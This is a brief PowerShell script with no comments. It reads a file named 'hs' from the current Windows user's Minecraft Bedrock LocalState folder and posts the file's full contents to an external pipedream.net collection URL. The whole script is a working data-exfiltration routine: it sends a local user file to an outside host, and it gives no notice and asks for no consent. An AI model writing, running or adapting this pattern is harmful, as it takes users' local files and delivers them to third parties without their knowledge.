$file = "C:\Users\" + $env:UserName + "\AppData\Local\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState\games\com.mojang\minecraftpe\hs"

$content = Get-Content $file -Raw

$url = "https://eoq75a60mukji5r.m.pipedream.net"

Invoke-RestMethod -Method Post -Uri $url -Body $content
